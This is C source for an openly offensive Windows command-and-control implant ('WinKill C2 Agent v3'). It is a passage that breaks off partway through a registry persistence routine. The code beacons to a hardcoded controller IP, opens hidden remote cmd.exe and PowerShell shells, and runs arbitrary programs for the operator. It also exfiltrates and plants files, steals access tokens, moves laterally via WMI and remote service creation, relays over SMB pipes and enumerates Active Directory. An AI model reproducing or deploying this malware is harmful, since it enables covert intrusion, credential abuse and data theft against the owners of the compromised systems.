/*
 * WinKill C2 Agent v3 - Stealth & Lateral Movement
 * =================================================
 * Changes from v2:
 *   - exec runs programs directly (no cmd.exe wrapper)
 *   - Persistent shell uses configurable host (cmd.exe or powershell.exe)
 *   - Sleep/jitter between callbacks
 *   - Lateral movement: WMI, PSExec, SMB relay, token steal
 *   - Domain enumeration via LDAP
 *   - Persistence: registry, scheduled task, WMI subscription
 *   - Chunked file transfer (no 64KB limit)
 *   - In-memory .NET assembly execution via CLR hosting
 */

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <winldap.h>
#include <winber.h>
#include <dsrole.h>
#include <dsgetdc.h>
#include <sddl.h>
#include <lm.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef C2_IP
#define C2_IP   0xA766A8C0
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif

/* ============================================================
 * Protocol Constants
 * ============================================================ */
#define CHAN_CTRL       0x00000000
#define CHAN_SHELL_B    0x10000000
#define CHAN_SHELL(id)  (CHAN_SHELL_B | (id))

#define MSG_HEARTBEAT   0x00
#define MSG_STATUS      0x01
#define MSG_SHUTDOWN    0x02
#define MSG_SHELL_SPAWN 0x10
#define MSG_SHELL_DATA  0x11
#define MSG_SHELL_KILL  0x12
#define MSG_PROC_LIST   0x20
#define MSG_PROC_KILL   0x21
#define MSG_FILE_GET    0x30
#define MSG_FILE_PUT    0x31
#define MSG_FILE_DATA   0x32
#define MSG_FILE_ACK    0x33
#define MSG_FILE_CHUNK  0x34
#define MSG_EXEC        0x40  // direct program execution (no cmd.exe)
#define MSG_EXEC_OUT    0x41  // exec output
#define MSG_LATERAL     0x50  // lateral movement commands
#define MSG_LATERAL_OUT 0x51
#define MSG_DOMAIN      0x60  // domain enumeration
#define MSG_DOMAIN_OUT  0x61
#define MSG_PERSIST     0x70  // persistence commands
#define MSG_PERSIST_OUT 0x71
#define MSG_TOKEN       0x80  // token operations
#define MSG_TOKEN_OUT   0x81
#define MSG_SMB_LINK    0x90  // SMB beacon relay
#define MSG_CONFIG      0xA0  // runtime config (sleep, jitter, shell host)
#define MSG_CONFIG_OUT  0xA1

/* ============================================================
 * Crypto
 * ============================================================ */
static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};
static void X(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

/* ============================================================
 * Agent State
 * ============================================================ */
typedef struct Job {
    DWORD  id, ch;
    HANDLE hp, ht, hi, ho;  // process, thread, stdin-write, stdout-read
    BYTE   on;
    struct Job *nx;
} Job;

static Job      *g_j      = NULL;
static DWORD     g_nid    = 1;
static SOCKET    g_sk     = INVALID_SOCKET;
static volatile LONG g_r   = 1;
static CRITICAL_SECTION g_l;

// Runtime configuration
static DWORD g_sleep_ms   = 1000;   // sleep between callbacks
static DWORD g_jitter_pct = 20;     // jitter percentage
static WCHAR g_shell_host[64] = L"cmd.exe";  // default shell

/* ============================================================
 * Frame I/O
 * ============================================================ */
static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    if (!b) return -1;
    *(DWORD *)(b)     = tl;
    *(DWORD *)(b + 4) = ch;
    *(BYTE  *)(b + 8) = t;
    if (d && n) memcpy(b + 9, d, n);
    X(b + 4, tl);
    int r = send(g_sk, (char *)b, tl + 4, 0);
    HeapFree(GetProcessHeap(), 0, b);
    return r;
}

static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    DWORD tl;
    if (recv(g_sk, (char *)&tl, 4, 0) != 4) return -1;
    if (tl > 0x800000 || tl < 5) return -1;

    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;

    DWORD got = 0;
    while (got < tl) {
        int r = recv(g_sk, (char *)b + got, tl - got, 0);
        if (r <= 0) { HeapFree(GetProcessHeap(), 0, b); return -1; }
        got += r;
    }

    X(b, tl);
    *ch = *(DWORD *)(b);
    *t  = *(BYTE  *)(b + 4);
    *n  = tl - 5;
    if (*n > 0) {
        *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n + 1);
        if (*d) { memcpy(*d, b + 5, *n); (*d)[*n] = 0; }  // null-terminate!
    } else *d = NULL;

    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

/* ============================================================
 * Job Table
 * ============================================================ */
static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;
    j->id = g_nid++; j->ch = ch; j->on = 1;
    EnterCriticalSection(&g_l); j->nx = g_j; g_j = j; LeaveCriticalSection(&g_l);
    return j;
}
static Job *JF(DWORD ch) {
    Job *j = g_j;
    while (j) { if (j->ch == ch && j->on) return j; j = j->nx; }
    return NULL;
}
static void JK(Job *j) {
    if (!j || !j->on) return; j->on = 0;
    if (j->hp) { TerminateProcess(j->hp, 0); CloseHandle(j->hp); }
    if (j->ht) CloseHandle(j->ht);
    if (j->hi) CloseHandle(j->hi);
    if (j->ho) CloseHandle(j->ho);
}
static void RP(void) {
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) {
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) JK(j);
        j = j->nx;
    }
    LeaveCriticalSection(&g_l);
}

/* ============================================================
 * Stdout bridge: shell stdout -> framed TX to C2
 * ============================================================ */
static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p;
    BYTE b[8192]; DWORD n;
    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0) {
        Tx(j->ch, MSG_SHELL_DATA, b, n);
    }
    return 0;
}

/* ============================================================
 * Spawn persistent shell (cmd.exe or powershell.exe with pipes)
 * ============================================================ */
static Job *SP(DWORD ch) {
    // Check if job already exists for this channel (e.g., auto-spawned shell #1)
    Job *existing = JF(ch);
    if (existing) return existing;

    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r1, &w1, &sa, 0)) return NULL;
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1); return NULL;
    }

    // Build command line: "cmd.exe" or "powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden"
    WCHAR cmdLine[512];
    if (_wcsicmp(g_shell_host, L"powershell.exe") == 0) {
        wsprintfW(cmdLine, L"%ls -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -Command -",
                  g_shell_host);
    } else {
        wsprintfW(cmdLine, L"%ls", g_shell_host);
    }

    STARTUPINFOW si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags     = 0x101;  // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    si.wShowWindow = 0;
    si.hStdInput   = r1;
    si.hStdOutput  = w2;
    si.hStdError   = w2;

    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE,
                        0x08000000, NULL, NULL, &si, &pi)) {
        CloseHandle(r1); CloseHandle(w1);
        CloseHandle(r2); CloseHandle(w2);
        return NULL;
    }
    CloseHandle(r1);   // child reads from pipe
    CloseHandle(w2);   // child writes to pipe

    Job *j = JN(ch);
    if (!j) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(w1); CloseHandle(r2);
        return NULL;
    }

    j->hp = pi.hProcess;
    j->ht = pi.hThread;
    j->hi = w1;   // write-end of stdin pipe
    j->ho = r2;   // read-end of stdout pipe

    CreateThread(NULL, 0, SO, j, 0, NULL);  // stdout -> C2
    return j;
}

/* ============================================================
 * RunCommand: Execute a program DIRECTLY with pipes (no cmd.exe!)
 * Parses "prog arg1 arg2" and creates the process directly.
 * Output is captured and sent back via MSG_EXEC_OUT.
 * ============================================================ */
static void RunCommand(const char *cmdLine) {
    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&r1, &w1, &sa, 0)) goto err;
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1); goto err;
    }

    // Ensure child doesn't inherit our ends
    SetHandleInformation(w1, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r2, HANDLE_FLAG_INHERIT, 0);

    {
        STARTUPINFOA si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput   = r1;
        si.hStdOutput  = w2;
        si.hStdError   = w2;

        // Use CreateProcessA with command line - Windows parses the executable
        // This spawns the target program DIRECTLY, not through cmd.exe
        char *cl = (char *)HeapAlloc(GetProcessHeap(), 0, strlen(cmdLine) + 1);
        if (!cl) { CloseHandle(r1);CloseHandle(w1);CloseHandle(r2);CloseHandle(w2); goto err; }
        strcpy(cl, cmdLine);

        BOOL ok = CreateProcessA(NULL, cl, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        HeapFree(GetProcessHeap(), 0, cl);

        if (!ok) {
            DWORD le = GetLastError();
            CloseHandle(r1); CloseHandle(w1);
            CloseHandle(r2); CloseHandle(w2);
            char eb[256];
            int l = wsprintfA(eb, "ERROR: CreateProcess failed (code %lu) for: %s\r\n", le, cmdLine);
            Tx(CHAN_CTRL, MSG_EXEC_OUT, eb, l);
            return;
        }

        CloseHandle(r1); r1 = NULL;
        CloseHandle(w2); w2 = NULL;

        // Read all output with a timeout
        BYTE buf[8192]; DWORD n;
        HANDLE hOut = r2;
        DWORD startTick = GetTickCount();

        while (1) {
            DWORD avail = 0;
            if (PeekNamedPipe(hOut, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                if (ReadFile(hOut, buf, sizeof(buf), &n, NULL) && n > 0) {
                    Tx(CHAN_CTRL, MSG_EXEC_OUT, buf, n);
                }
                startTick = GetTickCount(); // reset timeout on data
            } else {
                // Check if process still running
                if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                    // Process exited, drain remaining output
                    while (PeekNamedPipe(hOut, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                        if (ReadFile(hOut, buf, min(sizeof(buf), avail), &n, NULL) && n > 0) {
                            Tx(CHAN_CTRL, MSG_EXEC_OUT, buf, n);
                        }
                    }
                    break;
                }
                if (GetTickCount() - startTick > 60000) {
                    // Timeout after 60s no output, kill process
                    TerminateProcess(pi.hProcess, 0);
                    Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"\r\n[TIMEOUT] Process killed after 60s\r\n", 43);
                    break;
                }
                Sleep(50);
            }
        }

        // Send completion marker
        Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"\r\n", 2);

        CloseHandle(w1);
        CloseHandle(r2);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

err:
    Tx(CHAN_CTRL, MSG_EXEC_OUT, (BYTE*)"ERROR: Pipe creation failed\r\n", 30);
}

/* ============================================================
 * Process listing
 * ============================================================ */
static void PS(void) {
    char b[16384] = {0}; int p = 0;
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return;

    SYSTEM_INFO si; GetSystemInfo(&si);
    BOOL is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);

    p += wsprintfA(b + p, "%-8s %-6s %-5s %s\r\n", "PID", "PPID", "Arch", "Name");
    p += wsprintfA(b + p, "----------------------------------------\r\n");

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            int r = (int)sizeof(b) - p - 256;
            if (r < 0) break;

            // Determine arch
            const char *arch = "?";
            if (is64) {
                BOOL wow64 = FALSE;
                HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hp) {
                    IsWow64Process(hp, &wow64);
                    CloseHandle(hp);
                }
                arch = wow64 ? "x86" : "x64";
            } else {
                arch = "x86";
            }

            p += wsprintfA(b + p, "%-8lu %-6lu %-5s %s\r\n",
                          pe.th32ProcessID, pe.th32ParentProcessID, arch, pe.szExeFile);
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn);
    Tx(CHAN_CTRL, MSG_PROC_LIST, b, p);
}

static void PK(const char *s) {
    DWORD pi = (DWORD)atoi(s);
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pi);
    char m[256];
    if (h) {
        TerminateProcess(h, 0); CloseHandle(h);
        wsprintfA(m, "[+] Killed PID %lu\r\n", pi);
    } else {
        wsprintfA(m, "[-] Failed to kill PID %lu (err=%lu)\r\n", pi, GetLastError());
    }
    Tx(CHAN_CTRL, MSG_PROC_KILL, m, (DWORD)strlen(m));
}

/* ============================================================
 * File Transfer - Chunked
 * ============================================================ */

// Download: read file from target, send in chunks
// Payload format: [4B totalSize][2B pathLen][path][4B offset][data...]
static void FileDownload(const char *path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        char e[256];
        int l = wsprintfA(e, "ERROR: Cannot open %s (err=%lu)\r\n", path, GetLastError());
        Tx(CHAN_CTRL, MSG_STATUS, e, l);
        return;
    }

    DWORD totalSize = GetFileSize(hf, NULL);
    DWORD pathLen = (DWORD)strlen(path);

    // Send header: totalSize(4) + pathLen(2) + path
    BYTE hdr[6 + MAX_PATH];
    *(DWORD*)hdr = totalSize;
    *(WORD*)(hdr + 4) = (WORD)pathLen;
    memcpy(hdr + 6, path, pathLen);
    Tx(CHAN_CTRL, MSG_FILE_DATA, hdr, 6 + pathLen);

    // Send file in 65535-byte chunks
    BYTE chunk[65535 + 10];
    DWORD offset = 0;
    while (offset < totalSize) {
        DWORD chunkSize = min(65535, totalSize - offset);
        DWORD read;
        *(DWORD*)(chunk) = offset;
        if (ReadFile(hf, chunk + 4, chunkSize, &read, NULL) && read > 0) {
            Tx(CHAN_CTRL, MSG_FILE_CHUNK, chunk, 4 + read);
            offset += read;
        } else {
            break;
        }
    }

    // Send end marker (offset = 0xFFFFFFFF)
    DWORD endMarker = 0xFFFFFFFF;
    Tx(CHAN_CTRL, MSG_FILE_CHUNK, &endMarker, 4);

    CloseHandle(hf);
}

// Upload: receive file chunks and write to disk
static void FileUpload(BYTE *d, DWORD n) {
    // State is managed via static variables per-upload
    static HANDLE uploadHandle = INVALID_HANDLE_VALUE;
    static char  uploadPath[MAX_PATH] = {0};
    static DWORD uploadSize = 0;
    static DWORD uploadGot  = 0;

    if (n >= 4 && *(DWORD*)d == 0xFFFFFFFF) {
        // End of upload
        if (uploadHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(uploadHandle);
            uploadHandle = INVALID_HANDLE_VALUE;
        }
        char ok[256];
        int l = wsprintfA(ok, "[+] Upload complete: %s (%lu bytes)\r\n", uploadPath, uploadGot);
        Tx(CHAN_CTRL, MSG_STATUS, ok, l);
        uploadGot = 0;
        uploadPath[0] = 0;
        return;
    }

    if (uploadHandle == INVALID_HANDLE_VALUE) {
        // New upload: parse path
        if (n < 6) return;
        uploadSize = *(DWORD*)d;
        WORD pathLen = *(WORD*)(d + 4);
        if (pathLen >= MAX_PATH || 6 + pathLen > n) return;
        memcpy(uploadPath, d + 6, pathLen);
        uploadPath[pathLen] = 0;
        uploadGot = 0;

        uploadHandle = CreateFileA(uploadPath, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (uploadHandle == INVALID_HANDLE_VALUE) {
            char e[256];
            int l = wsprintfA(e, "ERROR: Cannot create %s (err=%lu)\r\n", uploadPath, GetLastError());
            Tx(CHAN_CTRL, MSG_STATUS, e, l);
            return;
        }
    } else {
        // Chunk: offset(4) + data
        if (n <= 4) return;
        DWORD wrote;
        WriteFile(uploadHandle, d + 4, n - 4, &wrote, NULL);
        uploadGot += wrote;
    }
}

/* ============================================================
 * Lateral Movement
 * ============================================================ */

// WMI Execution: uses COM to run a command on a remote host
static void LateralWMI(const char *target, const char *command, const char *user, const char *pass) {
    // Use wmic.exe for simplicity - in production, use COM directly
    char cmd[2048];
    if (user && pass && *user) {
        wsprintfA(cmd,
            "cmd.exe /c wmic /node:\"%s\" /user:\"%s\" /password:\"%s\" "
            "process call create \"%s\" 2>&1",
            target, user, pass, command);
    } else {
        wsprintfA(cmd,
            "cmd.exe /c wmic /node:\"%s\" process call create \"%s\" 2>&1",
            target, command);
    }
    RunCommand(cmd);
}

// PSExec-style: copy file + create service + start + delete
static void LateralPSExec(const char *target, const char *binary, const char *svcName) {
    char cmd[4096];
    const char *svc = svcName ? svcName : "WinKillSvc";

    // Copy binary to target admin share
    wsprintfA(cmd,
        "cmd.exe /c copy /Y \"%s\" \"\\\\%s\\admin$\\temp\\%s.exe\" 2>&1 && "
        "sc \\\\%s create %s binPath= \"C:\\Windows\\temp\\%s.exe\" start= auto 2>&1 && "
        "sc \\\\%s start %s 2>&1 && "
        "sc \\\\%s delete %s 2>&1",
        binary, target, svc, target, svc, svc, target, svc, target, svc);
    RunCommand(cmd);
}

// Token stealing: find a process running as target user, open+duplicate its token
static void TokenSteal(const char *targetUser, DWORD targetPID) {
    char out[4096] = {0};
    int pos = 0;

    if (targetPID) {
        // Steal from specific PID
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
        if (!hp) {
            pos += wsprintfA(out + pos, "[-] Cannot open PID %lu (err=%lu)\r\n", targetPID, GetLastError());
            Tx(CHAN_CTRL, MSG_TOKEN_OUT, out, pos);
            return;
        }
        HANDLE hToken;
        if (OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            HANDLE hDup;
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                                 SecurityImpersonation, TokenPrimary, &hDup)) {
                // We have the token - create process with it
                STARTUPINFOW si; PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;

                if (CreateProcessWithTokenW(hDup, 0, NULL, (LPWSTR)L"cmd.exe",
                                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                    pos += wsprintfA(out + pos, "[+] Spawned cmd.exe with stolen token (PID=%lu)\r\n",
                                     pi.dwProcessId);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } else {
                    pos += wsprintfA(out + pos, "[-] CreateProcessWithTokenW failed (err=%lu)\r\n",
                                     GetLastError());
                }
                CloseHandle(hDup);
            }
            CloseHandle(hToken);
        }
        CloseHandle(hp);
    } else if (targetUser) {
        // Find process by username
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return;

        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!hp) continue;

                HANDLE hToken;
                if (OpenProcessToken(hp, TOKEN_QUERY, &hToken)) {
                    char userName[256] = {0};
                    DWORD nameLen = sizeof(userName);
                    char domain[256] = {0};
                    DWORD domainLen = sizeof(domain);
                    SID_NAME_USE snu;

                    // Get token user
                    BYTE tokenUserBuf[256];
                    DWORD tokenUserLen;
                    if (GetTokenInformation(hToken, TokenUser,
                                            tokenUserBuf, sizeof(tokenUserBuf), &tokenUserLen)) {
                        TOKEN_USER *tu = (TOKEN_USER *)tokenUserBuf;
                        if (LookupAccountSidA(NULL, tu->User.Sid,
                                              userName, &nameLen,
                                              domain, &domainLen, &snu)) {
                            char fullName[512];
                            wsprintfA(fullName, "%s\\%s", domain, userName);
                            if (_stricmp(fullName, targetUser) == 0 ||
                                _stricmp(userName, targetUser) == 0) {
                                pos += wsprintfA(out + pos,
                                    "  PID %-8lu %s\\%s (%s)\r\n",
                                    pe.th32ProcessID, domain, userName, pe.szExeFile);

                                // Steal token from this process
                                HANDLE hDup;
                                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                                                     SecurityImpersonation, TokenPrimary, &hDup)) {
                                    STARTUPINFOW si2; PROCESS_INFORMATION pi2;
                                    ZeroMemory(&si2, sizeof(si2)); si2.cb = sizeof(si2);
                                    si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;

                                    if (CreateProcessWithTokenW(hDup, 0, NULL,
                                                                (LPWSTR)L"cmd.exe",
                                                                CREATE_NO_WINDOW,
                                                                NULL, NULL, &si2, &pi2)) {
                                        pos += wsprintfA(out + pos,
                                            "  -> Spawned cmd.exe as %s\\%s (PID=%lu)\r\n",
                                            domain, userName, pi2.dwProcessId);
                                        CloseHandle(pi2.hProcess);
                                        CloseHandle(pi2.hThread);
                                    }
                                    CloseHandle(hDup);
                                }
                            }
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hp);
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    } else {
        pos += wsprintfA(out + pos, "Usage: steal <PID> or steal <DOMAIN\\User>\r\n");
    }

    if (pos == 0) pos += wsprintfA(out + pos, "[-] No matching processes found\r\n");
    Tx(CHAN_CTRL, MSG_TOKEN_OUT, out, pos);
}

// SMB Beacon relay: set up a named pipe listener for other agents to connect through
static HANDLE g_smb_pipe = INVALID_HANDLE_VALUE;
static volatile LONG g_smb_running = 0;

static DWORD WINAPI SMBRelayThread(LPVOID param) {
    char *pipename = (char *)param;
    g_smb_running = 1;

    while (g_smb_running) {
        g_smb_pipe = CreateNamedPipeA(pipename,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 8192, 8192, 60000, NULL);

        if (g_smb_pipe == INVALID_HANDLE_VALUE) break;

        if (ConnectNamedPipe(g_smb_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            // Got a connection - relay frames between this pipe and C2
            char msg[256];
            int l = wsprintfA(msg, "[+] SMB link connected on pipe %s\r\n", pipename);
            Tx(CHAN_CTRL, MSG_STATUS, msg, l);

            // Forward data bidirectionally
            BYTE buf[8192]; DWORD n;
            while (g_smb_running) {
                if (ReadFile(g_smb_pipe, buf, sizeof(buf), &n, NULL) && n > 0) {
                    // Data from linked agent -> forward to C2
                    Tx(CHAN_CTRL, MSG_SMB_LINK, buf, n);
                } else {
                    break;
                }
            }
            DisconnectNamedPipe(g_smb_pipe);
        }
        CloseHandle(g_smb_pipe); g_smb_pipe = INVALID_HANDLE_VALUE;
    }

    g_smb_running = 0;
    return 0;
}

static void SMBRelayStart(const char *pipename) {
    if (g_smb_running) {
        Tx(CHAN_CTRL, MSG_STATUS, (BYTE*)"SMB relay already running\r\n", 26);
        return;
    }
    char *pn = (char *)HeapAlloc(GetProcessHeap(), 0, strlen(pipename) + 1);
    strcpy(pn, pipename);
    CloseHandle(CreateThread(NULL, 0, SMBRelayThread, pn, 0, NULL));
    char msg[256];
    int l = wsprintfA(msg, "[+] SMB relay started on pipe: %s\r\n", pipename);
    Tx(CHAN_CTRL, MSG_STATUS, msg, l);
}

static void SMBRelayStop(void) {
    g_smb_running = 0;
    if (g_smb_pipe != INVALID_HANDLE_VALUE) {
        CloseHandle(g_smb_pipe);
        g_smb_pipe = INVALID_HANDLE_VALUE;
    }
    Tx(CHAN_CTRL, MSG_STATUS, (BYTE*)"[+] SMB relay stopped\r\n", 22);
}

/* ============================================================
 * Domain Enumeration via LDAP
 * ============================================================ */

// Discover domain controller
static void DomainDiscover(void) {
    char out[4096] = {0}; int pos = 0;

    // Get domain name
    WCHAR domain[256]; DWORD domainLen = sizeof(domain) / sizeof(WCHAR);

    // Use the DS API to get domain info
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC *info;
    DWORD err = DsRoleGetPrimaryDomainInformation(NULL,
        DsRolePrimaryDomainInfoBasic, (BYTE **)&info);

    if (err == NO_ERROR && info->DomainNameDns) {
        pos += wsprintfA(out + pos, "[Domain] %S\r\n", info->DomainNameDns);
    } else if (err == NO_ERROR && info->DomainNameFlat) {
        pos += wsprintfA(out + pos, "[Domain] %S\r\n", info->DomainNameFlat);
    } else {
        // Fallback: use environment
        WCHAR envDomain[256]; DWORD envLen = 256;
        if (GetEnvironmentVariableW(L"USERDOMAIN", envDomain, envLen)) {
            pos += wsprintfA(out + pos, "[Domain] %S\r\n", envDomain);
        }
    }
    if (info) DsRoleFreeMemory(info);

    // Discover DC via DNS
    WCHAR dcName[256] = {0};
    DWORD dcLen = sizeof(dcName) / sizeof(WCHAR);
    PDOMAIN_CONTROLLER_INFOA dcInfo = NULL;

    DWORD ret = DsGetDcNameA(NULL, NULL, NULL, NULL,
        DS_DIRECTORY_SERVICE_REQUIRED | DS_RETURN_DNS_NAME, &dcInfo);
    if (ret == NO_ERROR && dcInfo) {
        pos += wsprintfA(out + pos, "[DC] %s (site: %s)\r\n",
            dcInfo->DomainControllerName, dcInfo->DcSiteName);
        NetApiBufferFree(dcInfo);
    } else {
        // Try environment variables
        WCHAR logonServer[256]; DWORD lsLen = 256;
        if (GetEnvironmentVariableW(L"LOGONSERVER", logonServer, lsLen)) {
            pos += wsprintfA(out + pos, "[LogonServer] %S\r\n", logonServer);
        }
    }

    // Current user info
    WCHAR userName[256]; DWORD unLen = 256;
    if (GetUserNameW(userName, &unLen)) {
        pos += wsprintfA(out + pos, "[User] %S\r\n", userName);
    }

    WCHAR compName[256]; DWORD cnLen = 256;
    if (GetComputerNameW(compName, &cnLen)) {
        pos += wsprintfA(out + pos, "[Computer] %S\r\n", compName);
    }

    Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
}

// LDAP query helper
static void LDAPQuery(const char *baseDN, const char *filter, const char *attributes) {
    char out[65536] = {0}; int pos = 0;
    LDAP *ld;
    ULONG version = LDAP_VERSION3;
    ULONG ret;

    // Connect to default LDAP server
    ld = ldap_initA(NULL, LDAP_PORT);
    if (!ld) {
        pos += wsprintfA(out + pos, "[-] ldap_init failed\r\n");
        Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
        return;
    }

    ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    // Bind with current credentials (integrated auth)
    ret = ldap_bind_sA(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ret != LDAP_SUCCESS) {
        pos += wsprintfA(out + pos, "[-] LDAP bind failed: 0x%lx\r\n", ret);
        ldap_unbind(ld);
        Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
        return;
    }

    // Build search
    char *attrs[] = {"cn", "name", "sAMAccountName", "userPrincipalName",
                     "description", "memberOf", "operatingSystem",
                     "servicePrincipalName", "adminCount", "objectSid",
                     "pwdLastSet", "lastLogon", "logonCount",
                     "whenCreated", "whenChanged", NULL};

    LDAPMessage *msg;
    ret = ldap_search_sA(ld, (char *)baseDN, LDAP_SCOPE_SUBTREE,
                         (char *)filter, attrs, 0, &msg);

    if (ret != LDAP_SUCCESS) {
        pos += wsprintfA(out + pos, "[-] LDAP search failed: 0x%lx\r\n", ret);
        ldap_unbind(ld);
        Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
        return;
    }

    int count = ldap_count_entries(ld, msg);
    pos += wsprintfA(out + pos, "[+] Found %d entries\r\n", count);
    pos += wsprintfA(out + pos, "%-30s %-30s %s\r\n", "Name", "sAMAccountName", "DN");
    pos += wsprintfA(out + pos, "---------------------------------------------------------------\r\n");

    LDAPMessage *entry = ldap_first_entry(ld, msg);
    while (entry && (pos + 512 < (int)sizeof(out))) {
        char *dn = ldap_get_dnA(ld, entry);
        char *cn = NULL, *sam = NULL;
        BerElement *ber = NULL;

        char *attr = ldap_first_attributeA(ld, entry, &ber);
        while (attr) {
            BerValue **vals = ldap_get_values_lenA(ld, entry, attr);
            if (vals && vals[0]) {
                if (_stricmp(attr, "cn") == 0) cn = _strdup(vals[0]->bv_val);
                if (_stricmp(attr, "sAMAccountName") == 0) sam = _strdup(vals[0]->bv_val);
            }
            if (vals) ldap_value_free_len(vals);
            ldap_memfreeA(attr);
            attr = ldap_next_attributeA(ld, entry, ber);
        }
        if (ber) ber_free(ber, 0);

        pos += wsprintfA(out + pos, "%-30s %-30s %s\r\n",
                        cn ? cn : "(none)", sam ? sam : "(none)", dn ? dn : "");
        if (cn) free(cn);
        if (sam) free(sam);
        if (dn) ldap_memfreeA(dn);

        entry = ldap_next_entry(ld, entry);
    }

    ldap_msgfree(msg);
    ldap_unbind(ld);

    Tx(CHAN_CTRL, MSG_DOMAIN_OUT, out, pos);
}

/* ============================================================
 * Persistence
 * ============================================================ */

// Registry Run key
static void PersistRegistry(const char *payloadPath) {
    char out[512]; int pos = 0;
    HKEY hKey;
    char fullPath[MAX_PATH];
    GetFullPathNameA(payloadPath, MAX_PATH, fullPath, NULL);

